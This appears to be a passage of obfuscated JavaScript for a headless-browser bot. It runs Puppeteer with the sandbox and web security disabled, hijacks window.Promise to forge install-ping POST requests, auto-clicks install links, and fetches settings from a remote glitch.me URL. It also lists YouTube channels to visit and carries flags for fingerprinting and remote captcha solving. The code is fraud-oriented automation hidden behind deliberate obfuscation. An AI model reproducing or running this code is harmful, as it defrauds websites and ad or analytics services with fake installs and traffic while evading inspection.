              for (J = -0x1b56 * -0x1 + 0x2710 + -0x4256; J < -0x1 * 0x1619 + 0x1 * 0xc9 + 0x15a0; ++J)
                K = Q[J - (-0x1b7e + 0xeb7 * 0x1 + 0xcca)] ^ Q[J - (-0x1 * 0x952 + -0xa7 * 0x1f + 0x1d93)] ^ Q[J - (0xdef + 0x1 * -0x50c + -0x8d5 * 0x1)] ^ Q[J - (0x9d * -0x32 + 0x191a + 0x5a0 * 0x1)], Q[J] = K << -0x1fd + 0x1 * 0x17aa + 0x15ac * -0x1 | K >>> 0x1e * 0x13 + -0x1e17 + 0x1bfc;
              for (J = 0x8 * -0x101 + -0x1663 + 0xd * 0x257; J < -0x1170 + 0x1057 + 0x2b * 0x7; J += 0x1927 + -0x29 * -0x72 + -0x2b64)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x12c7 + 0xb77 * 0x1 + 0x755 | L >>> -0x2646 + -0x36a + 0x29cb * 0x1) + (M & N | ~M & O) + P + (-0x1a26 * -0x3001 + 0x1 * 0x7579507b + 0x68 * -0x4e7165) + Q[J] << -0xe62 + -0x243d * -0x1 + -0x15db) << 0x1868 + 0x27 * -0x1e + -0x3 * 0x69b | P >>> -0x1096 + 0x148 * 0x7 + -0x3 * -0x293) + (L & (M = M << 0x1999 * -0x1 + -0x35 * 0x30 + -0x1 * -0x23a7 | M >>> 0x146e + 0x17 * -0xfc + 0x238) | ~L & N) + O + (-0x3 * 0x2a973985 + 0x95c4f517 + -0xb * -0x63a78d3) + Q[J + (-0x1874 + 0x88 * -0x28 + 0x2db5)] << 0x131a + 0x1fe5 + -0x7 * 0x749) << 0x406 + 0x3f4 + -0x7f5 | O >>> 0x4 * 0x60d + 0x1c99 + -0x1 * 0x34b2) + (P & (L = L << 0x25ee + -0xbf2 + 0x56 * -0x4d | L >>> -0xce * -0x7 + 0x610 + -0xbb0) | ~P & M) + N + (-0xeddc76d * -0x6 + 0x21 * -0x1c99e2f + 0x57b618e * 0xb) + Q[J + (0x13a5 * -0x1 + -0xdd8 + 0x31 * 0xaf)] << -0x2 * -0xe9e + 0x3 * 0xb4b + 0x1 * -0x3f1d) << -0x9 * -0xa1 + 0x11d5 + -0x1779 | N >>> -0x1 * -0x2419 + -0x1b * 0x93 + -0x1 * 0x147d) + (O & (P = P << 0x96f + 0x1014 + 0xb * -0x24f | P >>> 0x3 * -0x779 + -0x22 * 0x3f + 0x1ecb * 0x1) | ~O & L) + M + (0x289f * -0x2fae5 + -0x1ad8f1 * -0x381 + 0x757df163) + Q[J + (0x1196 * 0x1 + 0x7bf + 0x1cf * -0xe)] << -0x234e * -0x1 + -0xc3b + -0x1713) << -0xc5a + 0x1230 + 0x1 * -0x5d1 | M >>> 0x1 * -0x1173 + -0x1f13 + 0x30a1) + (N & (O = O << 0x2c2 + -0x1 * 0x12dd + 0x1039 * 0x1 | O >>> 0x6 * 0x60d + 0x1 * -0x1d90 + 0x1 * -0x6bc) | ~N & P) + L + (0xf2387dd + -0x716b4d52 + 0xbcca3f0e) + Q[J + (0x5a5 + 0x1662 + -0x1c03)] << -0x14e3 + -0xe22 + -0x5 * -0x701, N = N << -0x23a4 + -0x1c6c + 0x402e | N >>> 0xa8b * -0x1 + -0xbb1 + 0x76a * 0x3;
              for (; J < 0x1a21 + 0x5 * 0x6b7 + -0x3b8c; J += -0xa91 * 0x2 + -0x5 * -0x707 + -0x5 * 0x2cc)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x44f + -0x249a + -0x814 * -0x4 | L >>> -0x24 * -0xbe + -0x4 * -0x1af + 0x2159 * -0x1) + (M ^ N ^ O) + P + (-0xe6c3 * 0x703 + -0xd35e0d * -0x95 + -0x5d9c8a7 * 0x1) + Q[J] << 0x1af9 * 0x1 + -0x10e4 + -0xa15) << 0x1 * -0x11db + 0x2321 + -0x1141 | P >>> 0x1cc9 + 0xb03 + -0x27b1) + (L ^ (M = M << 0x2a1 * -0x1 + 0x1862 * -0x1 + -0x5 * -0x56d | M >>> 0x20e9 + -0x1211 + 0x4f2 * -0x3) ^ N) + O + (0xbb05a53 * 0xe + 0x2 * -0x26220e95 + 0x17791841) + Q[J + (-0x169a + -0x126a + 0x2905)] << -0x201d + -0x3 * 0x883 + 0x39a6) << 0x286 + -0x5f3 * 0x3 + 0xf58 | O >>> 0x199 + -0xa1 * 0x2e + 0x6dc * 0x4) + (P ^ (L = L << -0x5 * -0x386 + -0x2a9 * 0x2 + 0x617 * -0x2 | L >>> -0x4d5 * 0x4 + 0x1b * 0x12f + -0xc9f) ^ M) + N + (0xcfffa950 + 0x9ce2d * 0x1ad + -0x12ee0a84 * 0x6) + Q[J + (0x1556 + -0x3 * 0x1f + -0x14f7)] << -0x7cd * 0x2 + -0x1c7c + -0xc6 * -0x39) << 0x29 * 0x29 + -0x1287 + 0xbfb * 0x1 | N >>> 0x769 + -0x4 * 0x183 + -0x142) + (O ^ (P = P << 0x1563 + -0x2043 * 0x1 + 0xafe | P >>> -0xc6 + -0x25e8 * -0x1 + -0x36 * 0xb0) ^ L) + M + (0x68f7f13c + 0x2f14 * -0x3ebae + 0x3f7c71ff * 0x3) + Q[J + (0x19 * 0x137 + -0xb8a + 0x92 * -0x21)] << 0x414 + -0x1a98 + 0x20c * 0xb) << -0x7d * 0x42 + -0x15ff + 0x363e | M >>> -0x2561 * 0x1 + -0x1 * 0xc1 + -0x3 * -0xcbf) + (N ^ (O = O << 0x12a + -0x12c2 + 0x2 * 0x8db | O >>> -0xb8e + 0x5 * 0x241 + 0x19 * 0x3) ^ P) + L + (0x1b4 * 0x77b70f + -0x25 * 0x71908c + -0x4c9ff5af) + Q[J + (-0x1 * -0x1f97 + -0x2039 * -0x1 + -0x3fcc)] << 0xd37 + 0xb * -0x137 + 0x26, N = N << -0x1 * 0x68d + -0xe * 0xf5 + 0xb * 0x1d3 | N >>> -0x1162 + -0x1 * -0x283 + 0xee1;
              for (; J < -0x1 * -0x60d + -0x16d * 0x6 + 0x2bd; J += -0x2ff + 0x105a + -0xd56)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x3 * -0x925 + -0x1913 * -0x1 + -0x3 * -0xcb | L >>> -0x1eb7 + -0x2f9 * 0x3 + 0x27bd) + (M & N | M & O | N & O) + P - (0x5bf8fead + -0x221ea9c7 * -0x3 + -0x5170b8de * 0x1) + Q[J] << -0x82e + -0x194f + 0x217d * 0x1) << -0x6a * -0x16 + 0xfff + -0x1916 | P >>> -0x2508 + -0x1 * -0xde5 + 0x1 * 0x173e) + (L & (M = M << 0x1b9 * -0x6 + -0x254d + 0x2fc1 | M >>> 0x5 * -0xa5 + 0x158a + -0x124f) | L & N | M & N) + O - (0x17f323 * -0x7f1 + -0x354786 * 0x2a5 + 0x7db * 0x3884ef) + Q[J + (-0xce7 * 0x1 + 0x2223 + -0x153b)] << 0x6 * 0x1b5 + -0x11bf + 0x11 * 0x71) << -0x25 * -0xad + -0x4bd + -0x47 * 0x49 | O >>> -0x3 * -0x56a + -0x2558 + -0x59 * -0x3d) + (P & (L = L << -0x7d + -0x25a1 + 0x263c | L >>> 0x1c96 + 0x12a0 + 0x72 * -0x6a) | P & M | L & M) + N - (-0xda31e12 + 0xc352efed + -0x44cb8eb7) + Q[J + (-0x48f + 0x89d + -0x40c)] << 0x16fb + -0xc32 + 0xfb * -0xb) << -0x1841 + 0x147b + 0x3cb | N >>> 0x3 * -0x3ef + 0x32 * 0x78 + -0xb88) + (O & (P = P << 0x267e * -0x1 + 0xef6 * -0x1 + 0x3592 | P >>> -0x9 * 0x27 + -0x1 * 0x17e5 + 0x1946) | O & L | P & L) + M - (0x759c02e7 + -0x32533ea6 * 0x1 + -0x2667ff1 * -0x13) + Q[J + (0x283 * 0x1 + 0x13b1 * -0x1 + -0x1 * -0x1131)] << 0x2415 + 0xe74 + 0x3289 * -0x1) << 0x1 * -0x2b3 + 0xd * 0x67 + 0x283 * -0x1 | M >>> 0x2577 + 0x117e * -0x1 + -0x13de * 0x1) + (N & (O = O << -0x2225 + 0xa89 + 0x17ba | O >>> -0x3ca + 0x1244 * 0x1 + 0x2 * -0x73c) | N & P | O & P) + L - (0xa370663 + 0x38a630a8 + 0x2e070c19) + Q[J + (0x21b9 + 0x1196 * -0x1 + -0x101f)] << 0x3cf * -0x5 + 0x13 * 0x66 + 0x3 * 0x3d3, N = N << 0x24f + -0xc80 + -0x1d * -0x5b | N >>> -0x1dea + -0x2182 + 0x3f6e;
              for (; J < 0xd72 * -0x1 + 0x9f0 + 0x3d2; J += 0x147 + -0x580 + -0x2 * -0x21f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x4f * 0x5f + 0x1d47 + 0xf | L >>> 0x924 + 0xc2e + 0x1537 * -0x1) + (M ^ N ^ O) + P - (-0x1 * -0x66cd1e4c + -0x1530c5a * -0x2a + -0x1177fbd1 * 0x6) + Q[J] << -0x32e + -0x1653 + -0x1 * -0x1981) << 0x1399 + 0x786 + -0x1b1a | P >>> 0x89f + -0x1acb + -0x1 * -0x1247) + (L ^ (M = M << -0x1 * -0x223a + 0xcb8 + -0x2ed4 | M >>> -0x15b * -0x15 + 0xdec + -0x2a61) ^ N) + O - (0x1118f * 0x628d + 0x1 * -0x245cd36d + -0x7aaac16 * 0x2) + Q[J + (0x325 * 0x5 + 0xc * -0x217 + 0x95c)] << 0x1ce4 + 0x1ca2 + -0x3986) << -0xd * -0x10f + 0x4 * 0x9 + -0xde2 * 0x1 | O >>> -0x1a1b + -0x1972 + 0x33a8) + (P ^ (L = L << 0x1 * -0x5cf + 0xbcb + -0x5de | L >>> 0x579 + 0x5 * -0x63a + -0x19ab * -0x1) ^ M) + N - (-0xc4992ac + 0x9124 * 0x602b + 0xb60efca) + Q[J + (-0xcd8 + 0x1 * -0xafe + -0x2fb * -0x8)] << 0x223f * -0x1 + -0x2 * 0xbdc + 0x39f7) << 0x59c * -0x1 + 0x1 * 0x2487 + -0x23 * 0xe2 | N >>> -0xc1d + -0x9 + 0xc41) + (O ^ (P = P << 0x1569 + 0xfed + -0x2538 | P >>> -0x2547 * 0x1 + -0xa9e + 0x2fe7) ^ L) + M - (-0x1f7b23f * 0x2f + -0x24307407 + 0xb6476bc2) + Q[J + (-0x1 * 0x21ad + 0x3d8 + -0x8 * -0x3bb)] << 0x7 * -0x3ab + -0x403 * -0x9 + -0xa6e) << 0x2de * -0xb + -0x1fa5 + 0xa * 0x652 | M >>> -0x19c + -0xb2f + 0xce6) + (N ^ (O = O << 0x267a + 0x1c71 + -0x42cd | O >>> 0x99f * 0x4 + 0x1 * -0x21f9 + -0x481) ^ P) + L - (-0x511fd * -0xbcc + 0x1 * 0x61bab177 + -0x1ef90b * 0x35b) + Q[J + (0x2 * -0xd87 + 0x2182 * -0x1 + 0x3c94)] << -0x2543 * 0x1 + 0x220e + -0x335 * -0x1, N = N << -0x976 + -0x1 * -0x2527 + -0x1b93 | N >>> -0x2 * 0x225 + 0x2 * -0xf80 + 0x234c;
              this['h0'] = this['h0'] + L << 0x769 * 0x2 + -0x1929 + 0xa57, this['h1'] = this['h1'] + M << 0x9 * 0x123 + -0x206c + 0x1631, this['h2'] = this['h2'] + N << -0x482 * -0x8 + 0xe58 + -0x3268, this['h3'] = this['h3'] + O << 0xf5c + 0x3ce * 0x5 + -0x5bb * 0x6, this['h4'] = this['h4'] + P << -0xb32 + -0x2f * 0x6a + 0x1ea8;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x18ca + -0x3 * -0x1ae + -0x1db8 & 0xba5 + 0x21 * 0xf5 + 0x2b * -0x101] + w[J >> 0x177c + -0x30b * -0x1 + 0x43 * -0x65 & 0x1f * 0x133 + 0x724 + -0xa * 0x46d] + w[J >> 0x22e * 0x5 + 0x119 * 0x1d + -0x2aa7 & 0xb * 0x14 + 0x2 * 0xb61 + -0x178f] + w[J >> 0x11e1 * 0x1 + 0xfb + 0xc * -0x191 & -0xa * -0x397 + 0x2 * -0xb8d + -0x1 * 0xcbd] + w[J >> -0x1832 + -0x7fb + 0x2039 & 0xa9 * 0x9 + 0x44a + -0xa2c] + w[J >> 0x1 * -0x155f + -0x1453 * -0x1 + -0x1 * -0x114 & -0xa * 0x3a6 + 0x75b * -0x1 + -0x6 * -0x751] + w[J >> 0x1b * 0x120 + 0x1846 + -0x36a2 & 0x1327 + -0x100d * -0x1 + 0x1 * -0x2325] + w[-0xff4 + -0xb * 0x179 + -0x10a * -0x1f & J] + w[K >> 0x16bc + 0x4f * -0x6a + -0x2 * -0x50b & 0x7f0 * 0x1 + 0x457 + -0x1 * 0xc38] + w[K >> 0x1a2c + -0x1594 + -0x24 * 0x20 & 0xaca + -0x25 * 0xab + -0x4 * -0x37f] + w[K >> 0x55d * 0x4 + -0x188 + -0x13d8 & 0x6 * 0x7 + -0x1040 + -0x1 * -0x1025] + w[K >> -0xe5d * 0x1 + -0x9 * 0x3bf + 0x3024 & 0xb78 + 0x1 * 0xc25 + -0x178e] + w[K >> -0x58c + -0xecf + 0x3 * 0x6cd & 0x233 * -0x8 + -0x2598 + 0x373f] + w[K >> 0x5e + -0x1cda + 0x1c84 & 0x2f9 * -0x7 + 0xe1a + 0x6c4] + w[K >> -0x24dd + -0x1c08 + 0x40e9 & 0xce1 + 0xb34 + -0x1806] + w[0x232b + 0x8b * 0x3d + 0x1 * -0x443b & K] + w[L >> -0x1a5b + -0x1003 * -0x1 + 0xdf * 0xc & 0x11 * -0x95 + -0x1 * 0x16f + 0xb63] + w[L >> -0x92e + -0x1e61 + 0x27a7 & 0x4f * -0x19 + -0x14 * 0x83 + 0x1202] + w[L >> -0x1bd1 + -0xd0 + 0x1cb5 & -0x196f + -0x2 * -0xaa3 + -0x87 * -0x8] + w[L >> 0xc11 + -0x9a2 + -0x25f & -0x5 * 0x433 + 0x2 * -0x831 + 0x2570] + w[L >> -0x9 * 0x378 + -0x1f6d + 0x1 * 0x3eb1 & -0x16e * 0x1 + -0x15f6 + -0xcf * -0x1d] + w[L >> -0x17 * 0x189 + -0x2e * 0x9d + 0x3f8d * 0x1 & -0x58 * -0x11 + 0x1 * 0x1c3d + 0x86 * -0x41] + w[L >> -0x8a * 0xb + 0x16a8 + -0x10b6 & 0x11e3 + 0x1b16 + 0x2 * -0x1675] + w[-0x86f + 0x202b + -0xd1 * 0x1d & L] + w[M >> -0x1 * -0x13af + -0x5 * 0x377 + 0x120 * -0x2 & 0x562 * -0x5 + -0x235c + -0x51 * -0xc5] + w[M >> 0x2 * 0x4b1 + 0x75a * 0x2 + -0x17fe & 0x10f4 + 0x1d4a + -0x2e2f] + w[M >> -0x2256 + 0x4 * 0x1f9 + 0x1a86 & -0x66a * 0x2 + 0x84 * -0x31 + 0x1 * 0x2627] + w[M >> -0x26 * -0xe1 + 0x1 * -0x13c8 + -0xd8e & -0x50 + 0x4 * 0x151 + -0x4e5] + w[M >> 0x17a2 + -0x79 * 0x2f + -0x15f & 0x450 * 0x3 + -0x22f7 + -0x1616 * -0x1] + w[M >> 0x7b7 * -0x5 + 0x1bec + 0xaaf & -0x143e + 0x1221 + 0x22c] + w[M >> 0x1 * 0xa1b + 0x19a3 + -0x21a * 0x11 & 0x197e + -0x222b + 0x8bc] + w[0xd25 + -0x6b4 + 0x2 * -0x331 & M] + w[N >> 0x6 * 0xb2 + -0x29e + 0x25 * -0xa & -0x1d31 + 0xa7 * -0x16 + 0x1 * 0x2b9a] + w[N >> 0x2380 + 0x13a + -0x24a2 & 0x9ac * -0x2 + 0x179 + 0x11ee] + w[N >> 0x5f * -0x39 + 0x15eb * -0x1 + -0x15 * -0x20e & -0x1 * 0x1589 + 0x121e + 0x37a] + w[N >> 0x1f7 * 0x6 + 0x6 * -0x5f8 + 0x1 * 0x1816 & -0x1020 + -0x12aa * 0x1 + -0x22d9 * -0x1] + w[N >> -0x3 * 0x7eb + -0x95f + 0x212c & -0x577 * -0x4 + -0x88 * 0x3c + 0xa13] + w[N >> -0x1ad * 0xb + 0x5 * 0x581 + 0x487 * -0x2 & -0x137 * 0x13 + 0x184 * -0x13 + 0x33f0] + w[N >> 0xdde + 0x2225 + -0x2fff & -0x17d4 + 0x7d6 + 0x1 * 0x100d] + w[0x1945 + 0x3fb * -0x2 + -0x1140 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x20b0 + 0x744 * -0x2 + -0x11 * 0x110 & -0xb2e + -0xb57 + 0x1784,
                J >> -0x1df + -0x31c + 0x50b & 0x4 * 0x55a + 0xff8 * -0x2 + -0x1 * -0xb87,
                J >> -0x2 * -0xdfb + -0xe75 * 0x2 + 0xfc & -0x8df * 0x3 + -0x2081 + 0xb * 0x577,
                0x2304 + -0x70c * -0x4 + -0x3e35 & J,
                K >> -0x11b7 + -0x1a2d * -0x1 + -0x85e & -0x2 * 0x856 + -0xf7c + 0xcf * 0x29,
                K >> -0xd64 + -0x3 * 0x283 + 0x14fd * 0x1 & 0x67e + -0x1ee7 + 0xc * 0x21e,
                K >> -0x62 * 0xb + -0x6c9 + 0xb07 & -0x1f95 + 0x1b7 * 0xc + 0xc00,
                -0x1 * -0x16f6 + -0x3 * 0xb71 + -0xe2 * -0xe & K,
                L >> -0xbc3 + -0x124b + 0x1e26 & -0x352 + 0x15d5 + 0x1184 * -0x1,
                L >> -0x260a + -0x243 * -0x7 + 0x1 * 0x1645 & -0x228a + -0x24 * -0xbf + 0x8ad,
                L >> -0x1f10 + 0x76d * -0x3 + 0x355f & 0xd79 + 0x1d2b + -0x29a5,
                -0x182 * 0x13 + -0x1f56 + -0xe9 * -0x43 & L,
                M >> 0x2389 + 0x2154 + -0x44c5 & -0x103f + 0x3 * -0xf9 + 0x1429,
                M >> 0xdc9 * 0x1 + 0x314 * 0x5 + -0x1d1d & 0x87d + -0x77a * -0x4 + -0x12b3 * 0x2,
                M >> -0x1 * 0x6ad + -0x3a1 * -0x2 + -0x8d & 0x1da0 + 0x268 + -0x1f09,
                0x1 * 0xbcb + 0x1 * 0x2423 + -0xfa5 * 0x3 & M,
                N >> 0x2093 * -0x1 + 0x1 * 0x21d + 0x1e8e & 0x1 * 0x130 + -0x435 * -0x9 + -0x260e,
                N >> -0x217d + -0x4 * 0x788 + 0x3fad * 0x1 & 0xaab * -0x3 + -0x3c5 * 0x1 + 0x24c5,
                N >> -0x21ae + -0x2 * 0x3de + 0x84a * 0x5 & 0x1379 + -0x45 * 0x1 + 0x1235 * -0x1,
                -0x1 * 0xaee + -0x1f25 + 0x2b12 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1 * 0x7a0 + 0x5 * -0x6d + -0x56b), (K = new DataView(J))['setUint32'](-0xd83 * 0x1 + -0x196e + 0x26f1, this['h0']), K['setUint32'](-0x15 * -0x8 + 0x4 * 0x4cf + -0x1 * 0x13e0, this['h1']), K['setUint32'](0xa * -0x232 + 0x1bc2 + 0x2 * -0x2e3, this['h2']), K['setUint32'](0x5 * 0x463 + 0x11c9 * -0x1 + -0x69 * 0xa, this['h3']), K['setUint32'](0x92 * -0x20 + 0x2665 + -0x1415, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1537 + -0x25db + 0x3b12];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            const X = b;
            let K = -0x2e5 * -0xd + -0x4b3 + -0x20ee;
            J[0x15 * -0x15b + -0x259 + 0x3a * 0x88]['toString']()[X(0x1e, 'cV$Z')]('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x741 * -0x3 + 0x170 * -0x1 + 0x1733] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x13f0 + -0x135b + 0x4 * -0x25), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x270c + 0x14 * 0x11f + 0xc4b * -0x5;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x33d * 0x6 + 0x1fa9 + -0x2d3b), Promise['resolve'](0x111c + -0xb48 + 0x15 * -0x47);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x119f + 0x3 * -0xc73 + -0x1 * -0x13ba; j < -0x23c1 + -0x112b + 0x34ed; j++)
    i();
}
const NETWORK_PATIENCE = -0x7 * 0x475 + 0x4 * 0x3cb + 0x2f47 + (-0x2057 + 0x191f * 0x1 + 0x2 * 0x978) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2487 * -0x1 + 0x133 * -0x4 + -0x3c2 * -0xb) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + Y(0x1c) + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    Z(0x17, 'sSdk') + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2197 + -0xe68 * 0x1 + 0x665 * -0x3);
    let h = e[f];
    if (c['XChmFd'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x241b + 0x7af * -0x5 + 0x1 * 0x4a86, r, s, t = -0x8b9 + -0x4 * 0x52a + 0x1d61; s = m['charAt'](t++); ~s && (r = q % (0xe3 + 0x2147 + -0x2f * 0xba) ? r * (0x6 * 0xad + -0x425 * -0x6 + -0x1cac) + s : s, q++ % (0x18bf * 0x1 + 0x1ff1 + -0x117 * 0x34)) ? o += String['fromCharCode'](0x3 * 0x269 + 0x2602 + 0x2c3e * -0x1 & r >> (-(0x26de * -0x1 + -0x5a + 0x273a) * q & 0x1657 + -0x20e2 + -0x5 * -0x21d)) : 0x35 * 0x95 + -0x1d00 + -0x1d9) {
          s = n['indexOf'](s);
        }
        for (let u = -0x93 * 0x2 + 0x267b + -0x1f7 * 0x13, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1 * 0x1ac9 + 0x125 * 0x20 + -0x3f59))['slice'](-(-0x56 * -0x6b + -0x3 * 0x6f7 + -0xf0b * 0x1));
        }
        return decodeURIComponent(p);
      };
      c['CbiyGB'] = i, b = arguments, c['XChmFd'] = !![];
    }
    const j = e[-0x2669 * 0x1 + 0x9ba + 0x1caf],
      k = f + j,
      l = b[k];
    return !l ? (h = c['CbiyGB'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x14be + 0x11a3 + 0x31b; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2197 + -0xe68 * 0x1 + 0x665 * -0x3);
    let h = e[f];
    if (b['QPmoLy'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x241b + 0x7af * -0x5 + 0x1 * 0x4a86, s, t, u = -0x8b9 + -0x4 * 0x52a + 0x1d61; t = n['charAt'](u++); ~t && (s = r % (0xe3 + 0x2147 + -0x2f * 0xba) ? s * (0x6 * 0xad + -0x425 * -0x6 + -0x1cac) + t : t, r++ % (0x18bf * 0x1 + 0x1ff1 + -0x117 * 0x34)) ? p += String['fromCharCode'](0x3 * 0x269 + 0x2602 + 0x2c3e * -0x1 & s >> (-(0x26de * -0x1 + -0x5a + 0x273a) * r & 0x1657 + -0x20e2 + -0x5 * -0x21d)) : 0x35 * 0x95 + -0x1d00 + -0x1d9) {
          t = o['indexOf'](t);
        }
        for (let v = -0x93 * 0x2 + 0x267b + -0x1f7 * 0x13, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1 * 0x1ac9 + 0x125 * 0x20 + -0x3f59))['slice'](-(-0x56 * -0x6b + -0x3 * 0x6f7 + -0xf0b * 0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x2669 * 0x1 + 0x9ba + 0x1caf,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1a * -0xd2 + -0x15a1 + 0x2af5; u < 0x73a + 0x15 * -0xad + 0x1 * 0x7f7; u++) {
          p[u] = u;
        }
        for (u = -0x1 * -0x61 + 0x3 * -0x543 + -0x1 * -0xf68; u < 0x1709 + 0x7c6 * 0x1 + -0x1dcf; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x2b * -0xdd + -0x80 * 0x10 + 0x2e1f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x11 * -0x91 + -0x57a + -0x427, q = -0x64d + -0x1 * -0x26fb + -0x20ae;
        for (let v = 0x1 * 0xaca + -0x25 * 0x27 + -0x527; v < n['length']; v++) {
          u = (u + (0x83f + 0x1008 + -0xc23 * 0x2)) % (0x1c66 + 0x441 * -0x1 + -0x1725), q = (q + p[u]) % (-0x1d48 + 0x2 * 0xd96 + -0x18e * -0x2), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xd0d + -0x153 * 0x11 + 0xa76)]);
        }
        return t;
      };
      b['VAtdgw'] = m, c = arguments, b['QPmoLy'] = !![];
    }
    const j = e[-0x39 + 0x97b + -0x942],
      k = f + j,
      l = c[k];
    return !l ? (b['jMgyjX'] === undefined && (b['jMgyjX'] = !![]), h = b['VAtdgw'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let searchTerms = [];
